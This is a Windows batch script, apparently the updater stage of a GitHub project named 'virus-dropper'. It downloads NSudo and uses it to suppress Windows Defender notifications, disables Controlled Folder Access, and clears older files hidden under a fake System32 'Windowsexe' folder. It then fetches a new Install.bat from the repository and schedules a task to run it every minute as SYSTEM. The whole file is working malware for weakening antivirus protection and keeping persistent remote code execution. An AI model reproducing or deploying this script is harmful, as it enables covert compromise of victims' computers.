@echo off
attrib "%systemroot%\System32\Windowsexe\Windows.exe" -h -s
attrib "%systemroot%\System32\Windowsexe\Update.bat" -h -s
attrib "%systemroot%\System32\Windowsexe\AV.bat" -h -s
Taskkill /IM "Windows.exe" /F
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/install/NSudo.exe" --output "NSudo.exe"
NSudo -U:T -ShowWindowMode:Hide reg add "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /t REG_DWORD /d "1" /f
powershell -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
del "%systemroot%\System32\Windowsexe\Windows.exe"
del "%systemroot%\System32\Windowsexe\AV.bat"
del "%systemroot%\System32\Windowsexe\Update.bat"
rd "%systemroot%\System32\Windowsexe"
NSudo -U:T -ShowWindowMode:Hide reg del "HKLM\Software\Policies\Microsoft\Windows Defender\UX Configuration" /v "Notification_Suppress" /f
del NSudo.exe
powershell -Command "Unregister-ScheduledTask -TaskName 'Windows.exe' -Confirm:$false"
powershell -Command "Unregister-ScheduledTask -TaskName 'AV.bat' -Confirm:$false"
powershell -Command "Unregister-ScheduledTask -TaskName 'Update.bat' -Confirm:$false"
powershell -Command "Unregister-ScheduledTask -TaskName 'uninstallTEMP' -Confirm:$false"
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/Install.bat" --output "Install.bat"
SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\Install.bat" /TN "installTEMP" /RL HIGHEST /RU SYSTEM